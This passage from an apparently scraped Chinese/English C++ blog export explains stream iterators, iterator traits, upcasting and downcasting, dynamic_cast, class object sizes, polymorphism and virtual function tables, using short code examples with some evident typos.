std::char_traits&lt;CharT&gt; &gt;class ostream_iterator : public std::iterator&lt;std::output_iterator_tag, void, void, void, void&gt; (until C++17) 1234template&lt; class T, class CharT = char, class Traits = std::char_traits&lt;CharT&gt;&gt;class ostream_iterator; (since C++17)std::ostream_iterator is a single-pass OutputIterator that writes successive objects of type T into the std::basic_ostream object for which it was constructed, using operator&lt;&lt;. Optional delimiter string is written to the output stream after every write operation. The write operation is performed when the iterator (whether dereferenced or not) is assigned to. Incrementing the std::ostream_iterator is a no-op.In a typical implementation, the only data members of std::ostream_iterator are a pointer to the associated std::basic_ostream and a pointer to the first character in the delimiter string.When writing characters, std::ostreambuf_iterator is more efficient, since it avoids the overhead of constructing and destructing the sentry object once per character.例子： 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iterator&gt;using namespace std;int main()&#123; // create ostream iterator for stream cout // - values are separated by a newline character ostream_iterator&lt;int&gt; intWriter(cout,\"\\n\"); // write elements with the usual iterator interface *intWriter = 42; intWriter++; *intWriter = 77; intWriter++; *intWriter = -5; // create collection with elements from 1 to 9 vector&lt;int&gt; coll = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9 &#125;; // write all elements without any delimiter copy (coll.cbegin(), coll.cend(), ostream_iterator&lt;int&gt;(cout)); cout &lt;&lt; endl; // write all elements with \" &lt; \" as delimiter copy (coll.cbegin(), coll.cend(), ostream_iterator&lt;int&gt;(cout,\" &lt; \")); cout &lt;&lt; endl;&#125; 结果为： 123454277-51234567891&lt;2&lt;3&lt;4&lt;5&lt;6&lt;7&lt;8&lt;9&lt; 注意分隔符类型为const char*。如果你传入string对象的话，就要调用c_str函数。 123456template&lt; class T, class CharT = char, class Traits = std::char_traits&lt;CharT&gt;, class Distance = std::ptrdiff_t &gt;class istream_iterator: public std::iterator&lt;std::input_iterator_tag, T, Distance, const T*, const T&amp;&gt; (until C++17) 12345template&lt; class T, class CharT = char, class Traits = std::char_traits&lt;CharT&gt;, class Distance = std::ptrdiff_t &gt;class istream_iterator; (since C++17)std::istream_iterator is a single-pass input iterator that reads successive objects of type T from the std::basic_istream object for which it was constructed, by calling the appropriate operator&gt;&gt;. The actual read operation is performed when the iterator is incremented, not when it is dereferenced. The first object may be read when the iterator is constructed or when the first dereferencing is done. Otherwise, dereferencing only returns a copy of the most recently read object.The default-constructed std::istream_iterator is known as the end-of-stream iterator. When a valid std::istream_iterator reaches the end of the underlying stream, it becomes equal to the end-of-stream iterator. Dereferencing or incrementing it further invokes undefined behavior.A typical implementation of std::istream_iterator holds two data members: a pointer to the associated std::basic_istream object and the most recently read value of type T.T must meet the DefaultConstructible, CopyConstructible, and CopyAssignable requirements.例子： 123456789101112131415161718#include &lt;iostream&gt;#include &lt;iterator&gt;using namespace std;int main()&#123; // create istream iterator that reads integers from cin istream_iterator&lt;int&gt; intReader(cin); // create end-of-stream iterator istream_iterator&lt;int&gt; intReaderEOF; // while able to read tokens with istream iterator // - write them twice while (intReader != intReaderEOF) &#123; cout &lt;&lt; \"once: \" &lt;&lt; *intReader &lt;&lt; endl; cout &lt;&lt; \"once again: \" &lt;&lt; *intReader &lt;&lt; endl; ++intReader; &#125;&#125; 输入： 11 2 3 f 4 结果为： 123456once: 1once again: 1once: 2once again: 2once: 3once again: 3 结果出现的问题在于，格式错误。 Move（搬移）迭代器12template&lt; class Iterator &gt;std::move_iterator&lt;Iterator&gt; make_move_iterator( const Iterator&amp; i ); (since C++11)(until C++14) 12template&lt; class Iterator &gt;std::move_iterator&lt;Iterator&gt; make_move_iterator( Iterator i ); (since C++14)(until C++17) 12template&lt; class Iterator &gt;constexpr std::move_iterator&lt;Iterator&gt; make_move_iterator( Iterator i ); (since C++17)make_move_iterator is a convenience function template that constructs a std::move_iterator for the given iterator i with the type deduced from the type of the argument. Iterator Trait（迭代器特性）12345struct input_iterator_tag &#123; &#125;;struct output_iterator_tag &#123; &#125;;struct forward_iterator_tag : public input_iterator_tag &#123; &#125;;struct bidirectional_iterator_tag : public forward_iterator_tag &#123; &#125;;struct random_access_iterator_tag : public bidirectional_iterator_tag &#123; &#125;; Defines the category of an iterator. Each tag is an empty type and corresponds to one of the five iterator categories: input_iterator_tag corresponds to InputIterator. output_iterator_tag corresponds to OutputIterator. forward_iterator_tag corresponds to ForwardIterator. bidirectional_iterator_tag corresponds to BidirectionalIterator. random_access_iterator_tag corresponds to RandomAccessIterator. Iterator category tags carry information that can be used to select the most efficient algorithms for the specific requirement set that is implied by the category.For every iterator type, a typedef std::iterator_traits\\&lt;Iterator>::iterator_category is available, which is an alias to one of these five tag types. 123456template&lt; class Iterator&gt;struct iterator_traits;template&lt; class T &gt;struct iterator_traits&lt;T*&gt;;template&lt; class T &gt;struct iterator_traits&lt;const T*&gt;; std::iterator_traits is the type trait class that provides uniform interface to the properties of Iterator types. This makes it possible to implement algorithms only in terms of iterators.The class defines the following types: difference_type - a type that can be used to identify distance between iterators value_type - the type of the values that can be obtained by dereferencing the iterator. This type is void for output iterators. pointer - defines a pointer to the type iterated over (value_type) reference - defines a reference to the type iterated over (value_type) iterator_category - the category of the iterator. Must be one of iterator category tags. The template can be specialized for user-defined iterators so that the information about the iterator can be retrieved even if the type does not provide the usual typedefs. 1234567template&lt; class Category, class T, class Distance = std::ptrdiff_t, class Pointer = T*, class Reference = T&amp; &gt; struct iterator; (deprecated in C++17)std::iterator is the base class provided to simplify definitions of the required types for iterators.其中第一个template参数定义迭代器种类，第二个参数用来定义元素类型，第三个参数用来定义difference类型，第四个参数用来定义point而类型，第五个参数用来定义reference类型。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"迭代器","slug":"迭代器","permalink":"http://coordinate.wang/tags/迭代器/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"Upcasting and Downcasting","slug":"2017-06-02-Upcasting and Downcasting","date":"2017-06-01T16:00:00.000Z","updated":"2018-02-18T03:29:06.752Z","comments":true,"path":"2017/06/02/2017-06-02-Upcasting and Downcasting/","link":"","permalink":"http://coordinate.wang/2017/06/02/2017-06-02-Upcasting and Downcasting/","excerpt":"","text":"转自bogotobogo UpcastingUpcasting is converting a derived-class reference or pointer to a base-class. In other words, upcasting allows us to treat a derived type as though it were its base type. It is always allowed for public inheritance, without an explicit type cast. This is a result of the is-a relationship between the base and derived classes.Here is the code dealing with shapes. We created Shape class, and derived Circle, Square, and Triangle classes from the Shape class. Then, we made a member function that talks to the base class: 1234567void play(Shape&amp; s) &#123; s.draw(); s.move(); s.shrink(); ....&#125; The function speaks to any Shape, so it is independent of the specific type of object that it’s drawing, moving, and shrinking. If in some other part of the program we use the play( ) function like below: 123456Circle c;Triangle t;Square sq;play(c);play(t);play(sq); Let’s check what’s happening here. A Triangle is being passed into a function that is expecting a Shape. Since a Triangle is a Shape, it can be treated as one by play(). That is, any message that play() can send to a Shape a Triangle can accept.Upcasting allows us to treat a derived type as though it were its base type. That’s how we decouple ourselves from knowing about the exact type we are dealing with.Note that it doesn’t say “If you’re a Triangle, do this, if you’re a Circle, do that, and so on.” If we write that kind of code, which checks for all the possible types of a Shape, it will soon become a messy code, and we need to change it every time we add a new kind of Shape. Here, however, we just say “You’re a Shape, I know you can move(), draw(), and shrink( ) yourself, do it, and take care of the details correctly.”The compiler and runtime linker handle the details. If a member function is virtual, then when we send a message to an object, the object will do the right thing, even when upcasting is involved.Note that the most important aspect of inheritance is not that it provides member functions for the new class, however. It’s the relationship expressed between the new class and the base class. This relationship can be summarized by saying, “The new class is a type of the existing class.” 1234567891011121314151617181920212223242526class Parent &#123;public: void sleep() &#123;&#125;&#125;;class Child: public Parent &#123;public: void gotoSchool()&#123;&#125;&#125;;int main( ) &#123; Parent parent; Child child; // upcast - implicit type cast allowed Parent *pParent = &amp;child; // downcast - explicit type case required Child *pChild = (Child *) &amp;parent; pParent -&gt; sleep(); pChild -&gt; gotoSchool(); return 0; &#125; A Child object is a Parent object in that it inherits all the data members and member functions of a Parent object. So, anything that we can do to a Parent object, we can do to a Child object. Therefore, a function designed to handle a Parent pointer (reference) can perform the same acts on a Child object without any problems. The same idea applies if we pass a pointer to an object as a function argument. Upcasting is transitive: if we derive a Child class from Parent, then Parent pointer (reference) can refer to a Parent or a Child object.Upcasting can cause object slicing when a derived class object is passed by value as a base class object, as in foo(Base derived_obj). DowncastingThe opposite process, converting a base-class pointer (reference) to a derived-class pointer (reference) is called downcasting. Downcasting is not allowed without an explicit type cast. The reason for this restriction is that the is-a relationship is not, in most of the cases, symmetric. A derived class could add new data members, and the class member functions that used these data members wouldn’t apply to the base class.As in the example, we derived Child class from a Parent class, adding a member function, gotoSchool(). It wouldn’t make sense to apply the gotoSchool() method to a Parent object. However, if implicit downcasting were allowed, we could accidentally assign the address of a Parent object to a pointer-to-Child 12Child *pChild = &amp;parent; // actually this won't compile // error: cannot convert from 'Parent *' to 'Child *' and use the pointer to invoke the gotoSchool() method as in the following line. 1pChild -&gt; gotoSchool(); Because a Parent isn’t a Child (a Parent need not have a gotoSchool() method), the downcasting in the above line can lead to an unsafe operation.C++ provides a special explicit cast called dynamic_cast that performs this conversion. Downcasting is the opposite of the basic object-oriented rule, which states objects of a derived class, can always be assigned to variables of a base class.One more thing about the upcasting:Because implicit upcasting makes it possible for a base-class pointer (reference) to refer to a base-class object or a derived-class object, there is the need for dynamic binding. That’s why we have virtual member functions.Pointer (Reference) type: known at compile time.Object type: not known until run time. Dynamic CastingThe dynamic_cast operator answers the question of whether we can safely assign the address of an object to a pointer of a particular type.Here is a similar example to the previous one. 123456789101112131415161718192021222324#include &lt;string&gt;class Parent &#123;public: void sleep() &#123; &#125;&#125;;class Child: public Parent &#123;private: std::string classes[10];public: void gotoSchool()&#123;&#125;&#125;;int main( ) &#123; Parent *pParent = new Parent; Parent *pChild = new Child; Child *p1 = (Child *) pParent; // #1 Parent *p2 = (Child *) pChild; // #2 return 0; &#125; Let look at the lines where we do type cast. 12Child *p1 = (Child *) pParent; // #1Parent *p2 = (Child *) pChild; // #2 Which of the type cast is safe?The only one guaranteed to be safe is the ones in which the pointer is the same type as the object or else a base type for the object.Type cast #1 is not safe because it assigns the address of a base-class object (Parent) to a derived class (Child) pointer. So, the code would expect the base-class object to have derived class properties such as gotoSchool() method, and that is false. Also, Child object, for example, has a member classes that a Parent object is lacking.Type case #2, however, is safe because it assigns the address of a derived-class object to a base-class pointer. In other words, public derivation promises that a Child object is also a Parent object.The question of whether a type conversion is safe is more useful than the question of what kind of object is pointed to. The usual reason for wanting to know the type is so that we can know if it’s safe to invoke a particular method.Here is the syntax of dynamic_cast. 1Child *p = dynamic_cast&lt;Child *&gt;(pParent); This code is asking whether the pointer pParent can be type cast safely to the type Child *. It returns the address of the object, if it can.It returns 0, otherwise.How do we use the dynamic_cast? 123456void f(Parent* p) &#123; Child *ptr = dynamic_cast&lt;Child*&gt;(p); if(ptr) &#123; // we can safely use ptr &#125; &#125; In the code, if (ptr) is of the type Child or else derived directly or indirectly from the type Child, the dynamic_cast converts the pointer p to a pointer of type Child. Otherwise, the expression evaluates to 0, the null pointer.In other words, we want to check if we can use the passed in pointer p before we do some operation on a child class object even though it’s a pointer to base class.“The need for dynamic_cast generally arises because we want perform derived class operation on a derived class object, but we have only a pointer-or reference-to-base.” -Scott Meyers","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"upcasting","slug":"upcasting","permalink":"http://coordinate.wang/tags/upcasting/"},{"name":"downcasting","slug":"downcasting","permalink":"http://coordinate.wang/tags/downcasting/"}]},{"title":"C++类对象的内存模型和占用空间","slug":"2017-06-01-C++内存模型","date":"2017-05-31T16:00:00.000Z","updated":"2018-02-18T03:29:06.721Z","comments":true,"path":"2017/06/01/2017-06-01-C++内存模型/","link":"","permalink":"http://coordinate.wang/2017/06/01/2017-06-01-C++内存模型/","excerpt":"","text":"转自chinabinlang的专栏 很多C++书籍中都介绍过，一个Class对象需要占用多大的内存空间。最权威的结论是： 非静态成员变量总合。 加上编译器为了CPU计算，作出的数据对齐处理。 加上为了支持虚函数，产生的额外负担。 介绍完了理论知识后，再看看再找一个例子看看（注：一下所有结果都是在VC6.0 开发环境中得出的结论） 空类的Size123456789101112class Car&#123;&#125;;void main()&#123; int size = 0; Car objCar; size = sizeof(objCar); printf(\"%s %d /r\", \"Class Car Size:\", size);&#125; 输出结果：Class Car Size:1 这是为何呢？我想对于这个问题，不仅是刚入行不久的开发新手，就算有过几年以上C++开发经验的开发人员也未必能说清楚这个。编译器在执行Car objCar;这行代码后需要，作出一个Class Car的Object。并且这个Object的地址还是独一无二的，于是编译器就会给空类创建一个隐含的一个字节的空间。 只有成员变量的Size1234567891011121314class Car&#123;private: int nLength; int nWidth;&#125;;void main()&#123; int size = 0; Car objCar; size = sizeof(objCar); printf(\"%s %d /r\", \"Class Car Size:\", size);&#125; 输出结果：Class Car Size:8 这个结果很多开发人员都清楚。在32位系统中，整型变量占4个字节。这里Class Car中含有两个整型类型的成员变量，所以Class Size是8。 123456789101112131415class Car&#123;private: int nLength; int nWidth; static int sHigh;&#125;;void main()&#123; int size = 0; Car objCar; size = sizeof(objCar); printf(\"%s %d /r\", \"Class Car Size:\", size);&#125; 输出结果：Class Car Size:8 我们这次在Class Car中添加了一个静态成员变量，但是Class Size仍然是8个字节。这正好符合了，结论中的第一条：非静态成员变量总合。 123456789101112131415class Car&#123;private: char chLogo int nLength; int nWidth; static int sHigh;&#125;;void main()&#123; int size = 0; Car objCar; size = sizeof(objCar); printf(\"%s %d /r\", \"Class Car Size:\", size);&#125; 输出结果：Class Car Size:12 在类中又插入了一个字符型变量，结果Class Size变成了12。这个就是编译器额外添加3个字符变量，做数据对齐处理，为了是提高CPU的计算速度。编译器额外添加的东西我们是无法看见的。这也符合了结论中的第二条：加上编译器为了CPU计算，作出的数据对齐处理。 既然，我们这样定义类成员数据编译器会额外的增加空。那么，我们何不在定义类的时候就考虑到数据对齐的问题，可以多定义出3个字符类型变量作为预留变量，既能满足数据对齐的要求，也给自己的程序添加了一些可扩展的空间。 只有成员函数的Size123456789101112131415class Car&#123;public: Car()&#123;&#125;; ~Car()&#123;&#125;;public: void Fun()&#123;&#125;;&#125;;void main()&#123; int size = 0; Car objCar; size = sizeof(objCar); printf(\"%s %d /r\", \"Class Car Size:\", size);&#125; 输出结果：Class Car Size:1 噢，这是怎么回事儿呢？再做一个实验看看。 123456789101112131415161718class Car&#123;public: Car()&#123;&#125;; ~Car()&#123;&#125;;public: void Fun()&#123;&#125;;private: int nLength; int nWidth;&#125;;void main()&#123; int size = 0; Car objCar; size = sizeof(objCar); printf(\"%s %d /r\", \"Class Car Size:\", size);&#125; 输出结果：Class Car Size:8 这次应该很清楚的了。函数是不占用类空间的。第一个例子中的Size为1个字节，正是编译器为类创建一个隐含的一个字节的空间 123456789101112131415class Car&#123;public: Car()&#123;&#125;; virtual ~Car()&#123;&#125;;public: void Fun()&#123;&#125;;&#125;;void main()&#123; int size = 0; Car objCar; size = sizeof(objCar); printf(\"%s %d /r\", \"Class Car Size:\", size);&#125; 输出结果：Class Car Size:4 这次，让析构函数为虚函数，看到了Class Size为4。这正是指向Virtual Table的指针vptr的Size。这正好符合了，结论中的第三条：加上为了支持虚函数，产生的额外负担。到此为止，一个Class Object究竟占用多少内存空间，已经完全说清楚了。但是，这只是针对单独类，或者说是基类适用。对于子类，却不一样了。有兴趣的朋友可以做一些实验。 other example先看两段代码：代码段1： 12345678910class A&#123;public: int print()&#123; cout&lt;&lt;\"This is A\"&lt;&lt;endl;&#125;&#125;;inr main()&#123; A a; cout &lt;&lt; \"Size of A = \" &lt;&lt; sizeof(a) &lt;&lt; endl;&#125; 输出结果： 1Size of A =1 代码段2： 123456789101112class A&#123;public: int print1()&#123; cout&lt;&lt;\"This is A\"&lt;&lt;endl;&#125; int print2()&#123; cout&lt;&lt;\"This is A\"&lt;&lt;endl;&#125; int print3()&#123; cout&lt;&lt;\"This is A\"&lt;&lt;endl;&#125;&#125;;inr main()&#123; A a; cout &lt;&lt; \"Size of A = \" &lt;&lt; sizeof(a) &lt;&lt; endl;&#125; 输出结果： 1Size of A =1 对象的大小是它的数据成员所占存储空间之和，就和结构体一样。类中的函数是所有该类对象通用的方法，不算作对象的成员，因此也不算在对象的存储空间内。 问题：类里面不管有多少个函数，这个类的对象只占1个字节的内存。这个字节的内存的内容是什么？是指针吗？指针不是占4个字节吗？当类中类有定义任何变量的时候，类的对象都是1个字节的，当类中没有任何变量的时候，这个类里没有任何真正的成员变量，所以大小应该是0，但0大小不好在内存中定位一个地址，所以，就规定它大小为0的对象要占一字节空间，以便让它拥有一个合法的地址。如果是有派生类的，还有考虑到内存对齐的问题的。 另外涉及到虚函数的话又不一样了。如 12345class A&#123;public: virtual int print()&#123; cout&lt;&lt;\"This is A\"&lt;&lt;endl;&#125;&#125;; 如果sizeof(A)的话，得出的是4。原因是涉及到虚函数的实现问题。 12345678class Class1&#123; m_data1; m_data2; virtual vfunc1(); virtual vfunc2(); virtual vfunc3();&#125;; Class1对象实例通过vptr指针找到虚函数表 Vtable(虚函数表) 所以回到原来的问题，A中只有一个或者几个虚函数的话，没有成员变量，那么类A相当于含有一个vptr指向虚函数表的指针，所以sizeof(A)=4。 还有一点，如1234567891011121314151617181920class B&#123;&#125;;class B2&#123;&#125;;class C:public B&#123;&#125;;class D:public virtual B&#123;&#125;;class E:public B,public B2&#123;&#125;; 1sizeof(B) = 1; sizeof(B2) = 1; sizeof(C) = 1; sizeof(D) = 4; sizeof(E) = 1; 空类所占空间为一(上文以解释)，单一继承的空类空间也是1，多重继承的空类空间还是1，但是虚继承涉及到虚表(虚指针)，所以sizeof(D)=4。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"内存模型","slug":"内存模型","permalink":"http://coordinate.wang/tags/内存模型/"}]},{"title":"C++多态性","slug":"2017-05-31-C++多态问题小结","date":"2017-05-30T16:00:00.000Z","updated":"2018-02-18T03:29:06.705Z","comments":true,"path":"2017/05/31/2017-05-31-C++多态问题小结/","link":"","permalink":"http://coordinate.wang/2017/05/31/2017-05-31-C++多态问题小结/","excerpt":"","text":"转自Hackbuteer1的专栏 C++编程语言是一款应用广泛，支持多种程序设计的计算机编程语言。我们今天就会为大家详细介绍其中C++多态性的一些基本知识，以方便大家在学习过程中对此能够有一个充分的掌握。多态性可以简单地概括为“一个接口，多种方法”，程序在运行时才决定调用的函数，它是面向对象编程领域的核心概念。多态(polymorphism)，字面意思多种形状。C++多态性是通过虚函数来实现的，虚函数允许子类重新定义成员函数，而子类重新定义父类的做法称为覆盖(override)，或者称为重写。（这里我觉得要补充，重写的话可以有两种，直接重写成员函数和重写虚函数，只有重写了虚函数的才能算作是体现了C++多态性）而重载则是允许有多个同名的函数，而这些函数的参数列表不同，允许参数个数不同，参数类型不同，或者两者都不同。编译器会根据这些函数的不同列表，将同名的函数的名称做修饰，从而生成一些不同名称的预处理函数，来实现同名函数调用时的重载问题。但这并没有体现多态性。多态与非多态的实质区别就是函数地址是早绑定还是晚绑定。如果函数的调用，在编译器编译期间就可以确定函数的调用地址，并生产代码，是静态的，就是说地址是早绑定的。而如果函数调用的地址不能在编译器期间确定，需要在运行时才确定，这就属于晚绑定。那么多态的作用是什么呢，封装可以使得代码模块化，继承可以扩展已存在的代码，他们的目的都是为了代码重用。而多态的目的则是为了接口重用。也就是说，不论传递过来的究竟是那个类的对象，函数都能够通过同一个接口调用到适应各自对象的实现方法。最常见的用法就是声明基类的指针，利用该指针指向任意一个子类对象，调用相应的虚函数，可以根据指向的子类的不同而实现不同的方法。如果没有使用虚函数的话，即没有利用C++多态性，则利用基类指针调用相应的函数的时候，将总被限制在基类函数本身，而无法调用到子类中被重写过的函数。因为没有多态性，函数调用的地址将是一定的，而固定的地址将始终调用到同一个函数，这就无法实现一个接口，多种方法的目的了。 123456789101112131415161718192021222324252627282930313233343536373839#include&lt;iostream&gt; using namespace std; class A &#123; public: void foo() &#123; printf(\"1\\n\"); &#125; virtual void fun() &#123; printf(\"2\\n\"); &#125; &#125;; class B : public A &#123; public: void foo() &#123; printf(\"3\\n\"); &#125; void fun() &#123; printf(\"4\\n\"); &#125; &#125;; int main(void) &#123; A a; B b; A *p = &amp;a; p-&gt;foo(); p-&gt;fun(); p = &amp;b; p-&gt;foo(); p-&gt;fun(); return 0; &#125; 第一个p-&gt;foo()和p-&gt;fun()都很好理解，本身是基类指针，指向的又是基类对象，调用的都是基类本身的函数，因此输出结果就是1、2。第二个输出结果就是1、4。p-&gt;foo()和p-&gt;fun()则是基类指针指向子类对象，正式体现多态的用法，p-&gt;foo()由于指针是个基类指针，指向是一个固定偏移量的函数，因此此时指向的就只能是基类的foo()函数的代码了，因此输出的结果还是1。而p-&gt;fun()指针是基类指针，指向的fun是一个虚函数，由于每个虚函数都有一个虚函数列表，此时p调用fun()并不是直接调用函数，而是通过虚函数列表找到相应的函数的地址，因此根据指向的对象不同，函数地址也将不同，这里将找到对应的子类的fun()函数的地址，因此输出的结果也会是子类的结果4。笔试的题目中还有一个另类测试方法。即 1B *ptr = (B *)&amp;a; ptr-&gt;foo(); ptr-&gt;fun(); 问这两调用的输出结果。这是一个用子类的指针去指向一个强制转换为子类地址的基类对象。结果，这两句调用的输出结果是3，2。并不是很理解这种用法，从原理上来解释，由于B是子类指针，虽然被赋予了基类对象地址，但是ptr-&gt;foo()在调用的时候，由于地址偏移量固定，偏移量是子类对象的偏移量，于是即使在指向了一个基类对象的情况下，还是调用到了子类的函数，虽然可能从始到终都没有子类对象的实例化出现。而ptr-&gt;fun()的调用，可能还是因为C++多态性的原因，由于指向的是一个基类对象，通过虚函数列表的引用，找到了基类中fun()函数的地址，因此调用了基类的函数。由此可见多态性的强大，可以适应各种变化，不论指针是基类的还是子类的，都能找到正确的实现方法。关于向上向下造型可以看这篇Upcasting and Downcasting 总结12Class_B Val_b;Class_A Val_a = (Class_A*)Val_b; 此刻，Val_a的实函数是Class_A的类型，虚函数是Class_B的类型！！！指针的数据类型是实函数的类型，指针指向的对象的数据类型，是虚函数的数据类型从汇编的角度看，无非是指针的偏移问题，搞清楚哪个指针偏移多少，才是问题的本质。如果想要了解这个问题的本质，就要了解C++内存模型，也就是要知道内存中是如何存放虚函数的。可以看这篇文章C++类对象的内存模型和占用空间 重载与覆盖成员函数被重载的特征： 相同的范围（在同一个类中）； 函数名字相同； 参数不同； virtual关键字可有可无。 覆盖是指派生类函数覆盖基类函数，特征是： 不同的范围（分别位于派生类与基类）； 函数名字相同； 参数相同； 基类函数必须有virtual关键字。 令人迷惑的隐藏规则本来仅仅区别重载与覆盖并不算困难，但是C++的隐藏规则使问题复杂性陡然增加。这里“隐藏”是指派生类的函数屏蔽了与其同名的基类函数，规则如下： 如果派生类的函数与基类的函数同名，但是参数不同。此时，不论有无virtual关键字，基类的函数将被隐藏（注意别与重载混淆）。 如果派生类的函数与基类的函数同名，并且参数也相同，但是基类函数没有virtual关键字。此时，基类的函数被隐藏（注意别与覆盖混淆）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455//小结：1、有virtual才可能发生多态现象 // 2、不发生多态（无virtual）调用就按原类型调用 #include&lt;iostream&gt; using namespace std; class Base &#123; public: virtual void f(float x) &#123; cout&lt;&lt;\"Base::f(float)\"&lt;&lt; x &lt;&lt;endl; &#125; void g(float x) &#123; cout&lt;&lt;\"Base::g(float)\"&lt;&lt; x &lt;&lt;endl; &#125; void h(float x) &#123; cout&lt;&lt;\"Base::h(float)\"&lt;&lt; x &lt;&lt;endl; &#125; &#125;; class Derived : public Base &#123; public: virtual void f(float x) &#123; cout&lt;&lt;\"Derived::f(float)\"&lt;&lt; x &lt;&lt;endl; //多态、覆盖 &#125; void g(int x) &#123; cout&lt;&lt;\"Derived::g(int)\"&lt;&lt; x &lt;&lt;endl; //隐藏 &#125; void h(float x) &#123; cout&lt;&lt;\"Derived::h(float)\"&lt;&lt; x &lt;&lt;endl; //隐藏 &#125; &#125;; int main(void) &#123; Derived d; Base *pb = &amp;d; Derived *pd = &amp;d; // Good : behavior depends solely on type of the object pb-&gt;f(3.14f); // Derived::f(float) 3.14 pd-&gt;f(3.14f); // Derived::f(float) 3.14 // Bad : behavior depends on type of the pointer pb-&gt;g(3.14f); // Base::g(float) 3.14 pd-&gt;g(3.14f); // Derived::g(int) 3 // Bad : behavior depends on type of the pointer pb-&gt;h(3.14f); // Base::h(float) 3.14 pd-&gt;h(3.14f); // Derived::h(float) 3.14 return 0; &#125; 上面的程序中： 函数Derived::f(float)覆盖了Base::f(float)。 函数Derived::g(int)隐藏了Base::g(float)，而不是重载。 函数Derived::h(float)隐藏了Base::h(float)，而不是覆盖。 以下内容转自陈皓专栏 虚函数表对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。这里我们着重看一下这张虚函数表。C++的编译器应该是保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证取到虚函数表的有最高的性能——如果有多层继承或是多重继承的情况下）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。假设我们有这样的一个类： 123456class Base &#123;public: virtual void f() &#123; cout &lt;&lt; \"Base::f\" &lt;&lt; endl; &#125; virtual void g() &#123; cout &lt;&lt; \"Base::g\" &lt;&lt; endl; &#125; virtual void h() &#123; cout &lt;&lt; \"Base::h\" &lt;&lt; endl; &#125; &#125;; 按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程： 12345678910typedef void(*Fun)(void);Base b;Fun pFun = NULL;cout &lt;&lt; \"虚函数表地址：\" &lt;&lt; (int*)(&amp;b) &lt;&lt; endl;cout &lt;&lt; \"虚函数表 — 第一个函数地址：\" &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl; // Invoke the first virtual function pFun = (Fun)*((int*)*(int*)(&amp;b)); pFun(); 实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3)虚函数表地址：0012FED4虚函数表 — 第一个函数地址：0044F148Base::f 通过这个示例，我们可以看到，我们可以通过强行把&amp;b转成int *，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int * 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下： 123(Fun)*((int*)*(int*)(&amp;b)+0); // Base::f()(Fun)*((int*)*(int*)(&amp;b)+1); // Base::g()(Fun)*((int*)*(int*)(&amp;b)+2); // Base::h() 这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示： 注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“/0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系：请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示： 对于实例：Derive d; 的虚函数表如下： 我们可以看到下面几点： 虚函数按照其声明顺序放于表中。 父类的虚函数在子类的虚函数前面。 我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。 为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子： 我们从表中可以看到下面几点， 覆盖的f()函数被放到了虚表中原来父类虚函数的位置。 没有被覆盖的函数依旧。 这样，我们就可以看到对于下面这样的程序， 12Base *b = new Derive();b-&gt;f(); 由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。 对于子类实例中的虚函数表，是下面这个样子： 我们可以看到： 每个父类都有自己的虚表。 